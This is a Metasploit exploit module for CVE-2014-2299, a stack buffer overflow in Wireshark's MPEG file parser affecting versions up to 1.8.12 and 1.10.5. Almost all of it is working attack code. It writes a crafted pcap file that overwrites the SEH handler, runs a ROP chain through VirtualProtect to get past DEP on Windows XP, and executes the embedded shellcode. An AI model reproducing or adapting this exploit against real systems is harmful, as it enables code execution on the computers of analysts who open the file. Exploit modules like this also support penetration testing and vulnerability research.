# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Wireshark <= 1.8.12/1.10.5 wiretap/mpeg.c Stack Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module triggers a stack buffer overflow in Wireshark <= 1.8.12/1.10.5
          by generating an malicious file.)
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
    &#039;Wesley Neelen&#039;, # Discovery vulnerability
          &#039;j0sm1&#039;,  # Exploit and msf module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-2299&#039;],
          [ &#039;URL&#039;, &#039;https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=9843&#039; ],
          [ &#039;URL&#039;, &#039;http://www.wireshark.org/security/wnpa-sec-2014-04.html&#039; ],
          [ &#039;URL&#039;, &#039;http://www.securityfocus.com/bid/66066/info&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;,
        },
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => "\xff",
          &#039;Space&#039;       => 600,
          &#039;DisableNops&#039; => &#039;True&#039;,
          &#039;PrependEncoder&#039; => "\x81\xec\xc8\x00\x00\x00" # sub esp,200 
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;WinXP SP3 Spanish (bypass DEP)&#039;,
            {
              &#039;OffSet&#039; => 69732,
              &#039;OffSet2&#039; => 70476,
              &#039;Ret&#039;    => 0x1c077cc3, # pop/pop/ret -> "c:\Program Files\Wireshark\krb5_32.dll" (version: 1.6.3.16) 
              &#039;jmpesp&#039; => 0x68e2bfb9,
            }
          ],
    [ &#039;WinXP SP2/SP3 English  (bypass DEP)&#039;,
            {
              &#039;OffSet2&#039; => 70692,
              &#039;OffSet&#039; => 70476,
              &#039;Ret&#039;    => 0x1c077cc3, # pop/pop/ret -> krb5_32.dll module
              &#039;jmpesp&#039; => 0x68e2bfb9,
            }
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Mar 20 2014&#039;
    ))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [ true, &#039;pcap file&#039;,  &#039;mpeg_overflow.pcap&#039;]),
      ], self.class)
  end

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x61863c2a,  # POP EAX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x62d9027c,  # ptr to &VirtualProtect() [IAT libcares-2.dll]
      0x61970969,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
      0x61988cf6,  # XCHG EAX,ESI # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
      0x619c0a2a,  # POP EBP # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x61841e98,  # & push esp # ret  [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x6191d11a,  # POP EBX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x00000201,  # 0x00000201-> ebx
      0x5a4c1414,  # POP EDX # RETN [zlib1.dll, ver: 1.2.5.0] 
      0x00000040,  # 0x00000040-> edx
      0x6197660f,  # POP ECX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0]
      0x668242b9,  # &Writable location [libgnutls-26.dll]
      0x6199b8a5,  # POP EDI # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0
      0x63a528c2,  # RETN (ROP NOP) [libgobject-2.0-0.dll]
      0x61863c2a,  # POP EAX # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
      0x90909090,  # nop
      0x6199652d,  # PUSHAD # RETN [libgtk-win32-2.0-0.dll, ver: 2.24.14.0] 
    ].flatten.pack("V*")

    return rop_gadgets

  end

  def exploit

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")

    ropchain = create_rop_chain
    magic_header = "\xff\xfb\x41"                # mpeg magic_number(MP3) -> http://en.wikipedia.org/wiki/MP3#File_structure
    # Here we build the packet data
    packet = rand_text_alpha(883)
    packet << "\x6c\x7d\x37\x6c" # NOP RETN
    packet << "\x6c\x7d\x37\x6c" # NOP RETN
    packet << ropchain
    packet << payload.encoded                    # Shellcode
    packet << rand_text_alpha(target[&#039;OffSet&#039;] - 892 - ropchain.length - payload.encoded.length)

    # 0xff is a badchar for this exploit then we can&#039;t make a jump back with jmp $-2000
    # After nseh and seh we haven&#039;t space, then we have to jump to another location.

    # When file is open with command line. This is NSEH/SEH overwrite
    packet << make_nops(4) # nseh
    packet << "\x6c\x2e\xe0\x68" # ADD ESP,93C # MOV EAX,EBX # POP EBX # POP ESI # POP EDI # POP EBP # RETN

    packet << rand_text_alpha(target[&#039;OffSet2&#039;] - target[&#039;OffSet&#039;] - 8) # junk

    # When file is open with GUI interface. This is NSEH/SEH overwrite
    packet << make_nops(4) # nseh
    # seh -> # ADD ESP,86C # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [libjpeg-8.dll] **
    packet << "\x55\x59\x80\x6b"

    print_status("Preparing payload")
    filecontent = magic_header
    filecontent << packet
    print_status("Writing payload to file, " + filecontent.length.to_s()+" bytes")
    file_create(filecontent)

  end
end

